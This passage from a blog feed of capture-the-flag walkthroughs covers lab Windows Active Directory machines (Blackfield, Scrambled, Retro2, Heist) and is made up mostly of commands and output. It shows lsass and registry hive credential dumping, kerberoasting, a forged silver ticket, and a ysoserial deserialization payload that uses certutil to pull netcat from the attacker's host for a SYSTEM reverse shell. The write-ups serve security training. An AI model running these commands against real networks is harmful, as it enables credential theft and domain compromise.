# lsdrw-rw-rw-          0  Sun Feb 23 12:14:37 2020 .drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 ..-rw-rw-rw-        528  Sun Feb 23 12:12:54 2020 domain_admins.txt-rw-rw-rw-        962  Sun Feb 23 12:12:54 2020 domain_groups.txt-rw-rw-rw-      16454  Fri Feb 28 16:32:17 2020 domain_users.txt-rw-rw-rw-     518202  Sun Feb 23 12:12:54 2020 firewall_rules.txt-rw-rw-rw-       1782  Sun Feb 23 12:12:54 2020 ipconfig.txt-rw-rw-rw-       3842  Sun Feb 23 12:12:54 2020 netstat.txt-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt
Memory_analysis Directory:
     3842  Sun Feb 23 12:12:54 2020 netstat.txt-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt# cd ../memory_analysis# lsdrw-rw-rw-          0  Thu May 28 15:29:24 2020 .drw-rw-rw-          0  Thu May 28 15:29:24 2020 ..-rw-rw-rw-   37876530  Thu May 28 15:29:24 2020 conhost.zip-rw-rw-rw-   24962333  Thu May 28 15:29:24 2020 ctfmon.zip-rw-rw-rw-   23993305  Thu May 28 15:29:24 2020 dfsrs.zip-rw-rw-rw-   18366396  Thu May 28 15:29:24 2020 dllhost.zip-rw-rw-rw-    8810157  Thu May 28 15:29:24 2020 ismserv.zip-rw-rw-rw-   41936098  Thu May 28 15:29:24 2020 lsass.zip-rw-rw-rw-   64288607  Thu May 28 15:29:24 2020 mmc.zip-rw-rw-rw-   13332174  Thu May 28 15:29:24 2020 RuntimeBroker.zip-rw-rw-rw-  131983313  Thu May 28 15:29:24 2020 ServerManager.zip-rw-rw-rw-   33141744  Thu May 28 15:29:24 2020 sihost.zip-rw-rw-rw-   33756344  Thu May 28 15:29:24 2020 smartscreen.zip-rw-rw-rw-   14408833  Thu May 28 15:29:24 2020 svchost.zip-rw-rw-rw-   34631412  Thu May 28 15:29:24 2020 taskhostw.zip-rw-rw-rw-   14255089  Thu May 28 15:29:24 2020 winlogon.zip-rw-rw-rw-    4067425  Thu May 28 15:29:24 2020 wlms.zip-rw-rw-rw-   18303252  Thu May 28 15:29:24 2020 WmiPrvSE.zip
The lsass.zip caught my eye so I downloaded that to my machine and unziped it.
$ unzip lsass.zipArchive:  lsass.zip  inflating: lsass.DMP$ file lsass.DMPlsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
So we have a dump. We can use a python3 module pypykatz to dump this. This dumps everything including svc_backup‘s hash.
$ python3 -m pypykatz lsa minidump lsass.DMPINFO:pypykatz:Parsing file lsass.DMPFILE: ======== lsass.DMP ========= LogonSession ==authentication_id 406458 (633ba)session_id 2username svc_backupdomainname BLACKFIELDlogon_server DC01logon_time 2020-02-23T18:00:03.423728+00:00sid S-1-5-21-4194615774-2175524697-3563712290-1413luid 406458	== MSV ==		Username: svc_backup		Domain: BLACKFIELD		LM: NA		NT: &lt;SNIP&gt;		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c		DPAPI: a03cd8e9d30171f3cfe8caad92fef621&lt;SNIP&gt;

Shell as svc_backupGetting on the box and seeing what privileges we have.
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /all&lt;SNIP&gt;GROUP INFORMATION-----------------Group Name                                 Type             SID          Attributes========================================== ================ ============ ==================================================Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled groupBUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group&lt;SNIP&gt;PRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeBackupPrivilege             Back up files and directories  EnabledSeRestorePrivilege            Restore files and directories  EnabledSeShutdownPrivilege           Shut down the system           EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;SNIP&gt;
So where part of BackupOperators. Shouldn’t be too hard. Lets backup the SAM,SYSTEM,and SECURITY.
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\sam SAM.saveThe operation completed successfully.*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system SYSTEM.saveThe operation completed successfully.*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\security SECURITY.savereg.exe : ERROR: Access is denied.    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException    + FullyQualifiedErrorId : NativeCommandError
Hmmm….can’t backup the SECURITY locally, lets try remotely.
$ reg.py &#x27;blackfield.local&#x27;/&#x27;svc_backup&#x27;@&#x27;10.10.10.192&#x27; -hashes :&lt;SNIP&gt; save -keyName &#x27;HKLM\SECURITY&#x27; -o &#x27;C:\Users\svc_backup\Documents\&#x27;Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...[*] Saved HKLM\SECURITY to C:\Users\svc_backup\Documents\\SECURITY.save
Now we can download them on to our machine and dump the secrets.
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; ls    Directory: C:\Users\svc_backup\DocumentsMode                LastWriteTime         Length Name----                -------------         ------ -----a----        2/28/2025   3:54 PM          45056 SAM.save-a----        2/28/2025   6:02 PM          32768 SECURITY.save-a----        2/28/2025   3:54 PM       17371136 SYSTEM.save


$ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCALImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;SNIP&gt;[*] Cleaning up...
Shell as AdministratorFinally, we are administrator on the machine.
$ evil-winrm -i blackfield.local -u Administrator -p &lt;SNIP&gt;Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami;hostnameblackfield\administratorDC01

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>ASREPRoasting</tag>
        <tag>Hashcat</tag>
        <tag>pypykatz</tag>
        <tag>BackupOperators</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrambled (Windows Medium)</title>
    <url>/2025/04/01/Scrambled/</url>
    <content><![CDATA[
Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account SqlSvc has a Service Principal Name (SPN) associated with it. An attacker can use this information to perform an attack that is knows as kerberoasting and get the hash of SqlSvc. After cracking the hash and acquiring the credentials for the SqlSvc account an attacker can perform a silver ticket attack to forge a ticket and impersonate the user Administrator on the remote MSSQL service. Enumeration of the database reveals the credentials for user MiscSvc, which can be used to enumerate shares finding IT share readable. Looking at the files found from the share, reveals a .NET application, which is listening on port 4411. Reverse engineering the application reveals that it is using the insecure Binary Formatter class to transmit data, allowing the attacker to upload their own payload and get code execution as nt authority\system. 
Initial NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.088/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-01 14:18:04Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) 445/tcp   open  microsoft-ds? syn-ack ttl 127   464/tcp   open  kpasswd5?     syn-ack ttl 127 593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000 3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) 4411/tcp  open  found?        syn-ack ttl 1275985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                  60880/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                 
Port 4411Seems to be a custom app maybe?
$ telnet 10.10.11.168 4411                                                            Trying 10.10.11.168...Connected to 10.10.11.168.Escape character is &#x27;^]&#x27;.SCRAMBLECORP_ORDERS_V1.0.3;
We’ll can come back later.
HTTPUser found from website ksimpson. Looking at the password reset page, in short they are changing the password to the username. 

SMB (Authenticating Through Kerberos)Using kerberos to check if user is valid with the FQDN.
$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson                SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson
We can look at shares.
$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson --sharesSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson SMB         dc1.scrm.local  445    dc1              [*] Enumerated sharesSMB         dc1.scrm.local  445    dc1              Share           Permissions     RemarkSMB         dc1.scrm.local  445    dc1              -----           -----------     ------SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote AdminSMB         dc1.scrm.local  445    dc1              C$                              Default shareSMB         dc1.scrm.local  445    dc1              HR                              SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPCSMB         dc1.scrm.local  445    dc1              IT                              SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share SMB         dc1.scrm.local  445    dc1              Public          READ            SMB         dc1.scrm.local  445    dc1              Sales                           SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share
Looking at them with smbclient, Public is the only interesting one we can read.
impacket-smbclient &#x27;scrm.local/ksimpson:ksimpson@dc1.scrm.local&#x27; -k -no-passImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...Type help for list of commands# use Public# lsdrw-rw-rw-          0  Thu Nov  4 17:23:19 2021 .drw-rw-rw-          0  Thu Nov  4 17:23:19 2021 ..-rw-rw-rw-     630106  Fri Nov  5 12:45:07 2021 Network Security Changes.pdf
Upon grabbing and reading we see that there was a previous attack where an attacker targeted SQL. We will try that soon enough!
Kerberoasting cuz We care!!Looking at what SPNs are running under our user we find MSSQL associated with our user.
$ GetUserSPNs.py -dc-host dc1.scrm.local -k &#x27;scrm.local/ksimpson:ksimpson&#x27;Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...[-] CCache file is not found. Skipping...ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation ----------------------------  ------  --------  --------------------------  --------------------------  ----------MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217             MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217
We can request these and the try to crack. Which this gives a cleartext password for the svcsql account.  
Silver Ticket AttacksMSSQL is running, so we can forge a silver ticket and connect as the Administrator of the instance.
$ ticketer.py -nthash B990006500B87D000C70000A6877000 -domain-sid &#x27;S-1-5-21-2743207045-1827831105-2542523200&#x27; -user &#x27;sqlsvc&#x27; -domain &#x27;scrm.local&#x27; -spn &#x27;MSSQL//dc1.scrm.local:1433&#x27; -user-id &#x27;500&#x27; AdministratorImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos[*] Customizing ticket for scrm.local/Administrator[*]     PAC_LOGON_INFO[*]     PAC_CLIENT_INFO_TYPE[*]     EncTicketPart[*]     EncTGSRepPart[*] Signing/Encrypting final ticket[*]     PAC_SERVER_CHECKSUM[*]     PAC_PRIVSVR_CHECKSUM[*]     EncTicketPart[*]     EncTGSRepPart[*] Saving ticket in Administrator.ccache

Then we can export and connect to the MSSQL instance.
$ export KRB5CCNAME=Administrator.ccache$ impacket-mssqlclient -dc-ip 10.10.11.168 &#x27;scrm.local/Administrator@dc1.scrm.local&#x27; -k -no-pass -debugImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket[*] Encryption required, switching to TLS[+] Using Kerberos Cache: Administrator.ccache[+] SPN MSSQLSVC/:1433@SCRM.LOCAL not found in cache[+] AnySPN is True, looking for another suitable SPN[+] Returning cached credential for MSSQL/@SCRM.LOCAL[+] Using TGS from cache[+] Changing sname from MSSQL/@SCRM.LOCAL to MSSQLSVC/:1433@SCRM.LOCAL and hoping for the best[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(DC1): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(DC1): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (SCRM\administrator  dbo@master)&gt; 
Winner Winner SQL Dinner!!!
MSSQL (Through the Looking Glass)We can look through the database real quick to see if anything interesting is lingering about.
SQL (SCRM\administrator  dbo@master)&gt; select name from sys.databases;                                                                                            name                                                                                                  ----------   mastertempdbmodelmsdbScrambleHRSQL (SCRM\administrator  dbo@master)&gt; use ScrambleHR;ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR                                                                          INFO(DC1): Line 1: Changed database context to &#x27;ScrambleHR&#x27;.SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select name from sys.tables;name----------                                                                                            Employees    UserImport                                                                                                                     Timesheets                                                          SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select * from UserImport;LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   --------   -----------------   ----------   ---------------   -------------   MiscSvc    &lt;SNIP&gt;   scrm.local                90               0 

SMB I SeeUsing the new credentials we found for MiscSvc, lets look at shares again.
$ nxc smb dc1.scrm.local -k -u MiscSvc -p &lt;SNIP&gt; --sharesSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)SMB         dc1.scrm.local  445    dc1              [+] scrm.local\MiscSvc:&lt;SNIP&gt; SMB         dc1.scrm.local  445    dc1              [*] Enumerated sharesSMB         dc1.scrm.local  445    dc1              Share           Permissions     RemarkSMB         dc1.scrm.local  445    dc1              -----           -----------     ------SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote AdminSMB         dc1.scrm.local  445    dc1              C$                              Default shareSMB         dc1.scrm.local  445    dc1              HR                              SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPCSMB         dc1.scrm.local  445    dc1              IT              READ            SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share SMB         dc1.scrm.local  445    dc1              Public          READ            SMB         dc1.scrm.local  445    dc1              Sales                           SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share 
We have access to the IT share now. Looking inside we find a custom exe and dll file we can download and look at on our windows VM.
$ impacket-smbclient &#x27;scrm.local/MiscSvc:&lt;SNIP&gt;@dc1.scrm.local&#x27; -k -no-passImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...Type help for list of commands# use IT# lsdrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 .drw-rw-rw-          0  Wed Nov  3 14:32:55 2021 ..drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 Appsdrw-rw-rw-          0  Wed Nov  3 14:32:44 2021 Logsdrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 Reports# cd Apps# lsdrw-rw-rw-          0  Wed Nov  3 16:06:32 2021 .drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 ..drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 Sales Order Client# cd Sales Order Client# lsdrw-rw-rw-          0  Fri Nov  5 15:57:08 2021 .drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 ..-rw-rw-rw-      86528  Fri Nov  5 15:57:08 2021 ScrambleClient.exe-rw-rw-rw-      19456  Fri Nov  5 15:57:08 2021 ScrambleLib.dll# mget *
DnspyingAfter getting the files on our windows VM we can look at them in dnspy.
From this we can load both the exe and dll. The dll will hold libraries which we can look at called ScrambleLib. Inside them we find a library showing us a certain username we can use to bypass authentication.
Upon connecting with the domain we get the dashboard. Other tabs show a way to create a new order. We can enable debug logging from Tools so we get a output file we can read. Lets try to create an order and get output.

Making sense of the outputWe see that we are send data to the server LIST_ORDERS;. Also base64 and deserialization is being used, as well as Binary Formatting. We see near the bottom, UPLOAD_ORDER; and then base64. If we rememeber from the very beginning there was port 4411 running that gave us feedback.
Back to Suite 4411 with DeserializationWe can use ysoserial to encode our payloads. First we can setup a python server hosting ncat.
Windows VM:PS C:\Users\jay\Desktop\Tools\ysoserial-NET &gt; .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c &quot;certutil -f -urlcache http://10.10.14.7/nc64.exe C:\ProgramData\nc.exe&quot;Linux VM:$ telnet 10.10.11.168 4411                                               Trying 10.10.11.168...Connected to 10.10.11.168.Escape character is &#x27;^]&#x27;.SCRAMBLECORP_ORDERS_V1.0.3;UPLOAD_ORDER;AAEAAAD/////&lt;SNIP&gt;ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.SESSION_TIMED_OUT;$ sudo python3 -m http.server 80 --directory /usr/share/windows-binaries/[sudo] password for jaybit:Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.168 - - [01/Apr/2025 10:43:28] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -10.10.11.168 - - [01/Apr/2025 10:43:28] &quot;GET /nc64.exe HTTP/1.1&quot; 200 - 
So we got it to grab ncat. Now we can do the same thing and execute ncat now and once we do we get a shell back.
$ rlwrap nc -lvnp 9001                                                                                            listening on [any] 9001 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 50224Windows PowerShell                                          Copyright (C) Microsoft Corporation. All rights reserved.PS C:\Windows\system32&gt; whoamiwhoamint authority\system           


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>kerberoasting SPNs</tag>
        <tag>silver ticket</tag>
        <tag>mssql</tag>
        <tag>.NET</tag>
        <tag>Source Code Analysis</tag>
        <tag>Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Retro2 (Windows Easy)</title>
    <url>/2025/04/05/Retro2/</url>
    <content><![CDATA[
Retro2 is a Easy Windows machine, that starts off with Guest auth enabled to look at shares finding a Microsoft Access Database file. After finding the user and password we are able to obtain a bloodhound dump. This shows a relatively simple path with some twists, we are able to find a couple of Pre-Windows machine and change the password for one. Allowing us to change&#x2F;reset the password for the computer ADMWS01$ which has a particular attribute that allows the reset of the password. Once we’ve done this we are able to add our user to the Services group allowing for RDP access. Upon getting a session we find that with the version of Windows Server 2008 we are able to control the full path to a windows registry value that allows us to escalate to NT AUTHORITY\SYSTEM.
Initial NmapPORT      STATE SERVICE      VERSION53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)| dns-nsid:|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-08 15:45:22Z)135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)464/tcp   open  kpasswd5?593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.049158/tcp open  msrpc        Microsoft Windows RPCService Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: required| smb-os-discovery:|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1|   Computer name: BLN01|   NetBIOS computer name: BLN01\x00|   Domain name: retro2.vl|   Forest name: retro2.vl|   FQDN: BLN01.retro2.vl|_  System time: 2024-11-08T16:46:17+01:00| smb2-time:|   date: 2024-11-08T15:46:14|_  start_date: 2024-11-08T15:44:30| smb2-security-mode:|   2:1:0:|_    Message signing enabled and required|_clock-skew: mean: 47m06s, deviation: 34m35s, median: 1h07m04sNSE: Script Post-scanning.Initiating NSE at 08:39Completed NSE at 08:39, 0.00s elapsedInitiating NSE at 08:39Completed NSE at 08:39, 0.00s elapsedInitiating NSE at 08:39Completed NSE at 08:39, 0.00s elapsedRead data files from: /usr/share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 109.68 seconds           Raw packets sent: 1990 (87.536KB) | Rcvd: 17 (732B)

SMBFound LOTS users via brute forcing.
$ smb retro2.vl -u jay -p &#x27;&#x27; --rid-brute  | tr -s &quot; &quot; | awk -F&#x27;\&#x27; &#x27;&#123;print $2&#125;&#x27; | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.lst&lt;SNIP&gt;Julie.MartinClare.SmithLaura.DaviesRhys.RichardsLeah.RobinsonMichelle.Bird&lt;SNIP&gt;
Found MS Access Database. 

This file was password protected, so converting using office2john and cracking got us in and found creds.
strLDAP = &quot;LDAP://OU=staff,DC=retro2,DC=vl&quot;strUser = &quot;retro2\ldapreader&quot;strPassword = &quot;&lt;SNIP&gt;&quot;

BloodHoundNow we can get a bloodhound dump and look at our attack path. From there the path is relatively simple. We can use FS01$ or FS02$. I’m using FS01$.
Seeing as Pre-Windows machines use the same password as their hostname, we can check to see if we have an error that indicates a password change is needed. 
$ nxc smb retro2.vl -u &#x27;FS01$&#x27; -p fs01                                                                                         SMB         10.10.106.109   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)SMB         10.10.106.109   445    BLN01            [-] retro2.vl\FS01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
As we didn’t get a STATUS_LOGON_FAILURE, the password for this machine can be reset. We can use bloodyAD to set his password.
$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.106.109 --host retro2.vl -d retro2.vl -u &#x27;ldapreader&#x27; -p &#x27;&lt;SNIP&gt;&#x27; set password &#x27;FS01$&#x27; &#x27;Password123!&#x27; --oldpass fs01 [*] Trying to connect to retro2.vl...[+] Connection successful[+] Password changed successfully!

There are 3 ways to abuse the GenericWrite permission:

Shadow Credentials (applicable with Windows Server 2016  and later)
Targeted Kerberoasting(affective if your targets password is weak and crackable)
Resource-Based Constrained Delegation

None of which will work on this 2008 machine. 😒
Yet the Windows Server 2008 has an attribute, which if writable we can perform a password reset of ADMWS01$ Computer. This article explains some context.
$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u &#x27;FS01$&#x27; -p &#x27;Password123!&#x27; get writable --otype COMPUTER --detail                                                                                    [*] Trying to connect to retro2.vl... [+] Connection successful distinguishedName: CN=ADMWS01,CN=Computers,DC=retro2,DC=vlserviceInstance: CREATE_CHILDapplicationVersion: CREATE_CHILDms-net-ieee-80211-GroupPolicy: CREATE_CHILDrpcProfile: CREATE_CHILDrpcProfileElement: CREATE_CHILD msieee80211-Policy: CREATE_CHILD serviceAdministrationPoint: CREATE_CHILD   &lt;SNIP&gt;ntPwdHistory: WRITEotherLoginWorkstations: WRITEunicodePwd: WRITE &lt;-----userWorkstations: WRITEmaxStorage: WRITE&lt;SNIP&gt;
With the attribute writable, we can change&#x2F;reset the password for ADMWS01$. I found it difficult to do with bloodyAD but I used changepassword.py from Impacket that got the job done.
$ changepasswd.py -dc-ip 10.10.102.10 -altuser &#x27;FS01$&#x27; -altpass &#x27;Password123!&#x27; -newpass &#x27;Password123!&#x27; -p rpc-samr &#x27;retro2.vl/ADMWS01$@retro2.vl&#x27; -reset -admin Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [*] Setting the password of retro2.vl\ADMWS01$ as retro2.vl\FS01$[*] Connecting to DCE/RPC as retro2.vl\FS01$[*] Password was changed successfully.[!] User no longer has valid AES keys for Kerberos, until they change their password again.
Once we’ve done this, we can add ldapreader to the Services group which will allow him to RDP to the machine.
$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u &#x27;ADMWS01$&#x27; -p &#x27;Password123!&#x27; add groupMember &#x27;Services&#x27; &#x27;ldapreader&#x27;[*] Trying to connect to retro2.vl...[+] Connection successful[+] ldapreader added to Services

Session as ldapreaderWe can get a session going via RDP.
$ xfreerdp /v:retro2.vl /u:ldapreader /p:&lt;SNIP&gt; /tls-seclevel:0 +clipboard /dynamic-resolution

I looked around and did some research about Windows Server 2008 R2, finding some articles but I came across something of a no fix by itm4n. Explaining that using Get-WmiObject Win32_Perf can query the Performance counters of the machine and when doing so the WMI service should load a specified DLL that gets us NT AUTHORITY\SYSTEM. 

PrivEscOnce downloading the repo, and compiling, we can transfer it over to the machine and execute it. 


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>Pre-Windows 2000</tag>
        <tag>SMB</tag>
        <tag>No-Fix RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>Heist (Windows Easy)</title>
    <url>/2025/04/06/Heist/</url>
    <content><![CDATA[
Heist is a Windows Easy box, I wanted to take it easy and doing something relaxing and this was very interesting to say the least. This starts out with a website that you’re able to login as a guest and read the recent posts. When you do you gather a user name, as well as see an attachment. This attactment is a cisco config file. You’re able to deduce what type of hash the passwords are and crack them. From there your able to get a list of users, and then spray to find one allows for winrm access. Upon looking a directories and anything from the norm, you find processes running and a particular firefox is running, which can allow for dumping the process memory if its still being used. Using procdump64.exe, we’re able to dump the process memory and filter through and retrieve the Administrator password.
